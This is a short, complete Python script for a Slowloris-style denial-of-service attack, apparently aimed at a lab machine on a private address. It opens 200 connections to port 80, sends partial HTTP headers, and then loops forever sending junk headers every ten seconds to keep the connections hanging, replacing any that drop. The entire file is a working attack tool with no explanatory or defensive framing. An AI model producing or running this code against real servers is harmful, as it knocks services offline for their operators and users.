import socket
import time
import random

# CONFIGURATION
TARGET_IP = "10.11.100.16" # Your Arch IP
TARGET_PORT = 80
CONNECTION_COUNT = 200

sockets = []

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET_IP, TARGET_PORT))
        # Send a partial header
        s.send(f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None

print(f"[*] Starting Slow Attack on {TARGET_IP}...")

# Initial connection flood
for _ in range(CONNECTION_COUNT):
    s = create_socket()
    if s:
        sockets.append(s)

print(f"[*] Created {len(sockets)} hanging connections.")

# Keep them alive by sending junk headers periodically
while True:
    print(f"[*] Sending keep-alive headers to {len(sockets)} sockets...")
    for s in list(sockets):
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
        except socket.error:
            sockets.remove(s)
            # Try to replace the dead socket
            new_s = create_socket()
            if new_s:
                sockets.append(new_s)
    time.sleep(10)
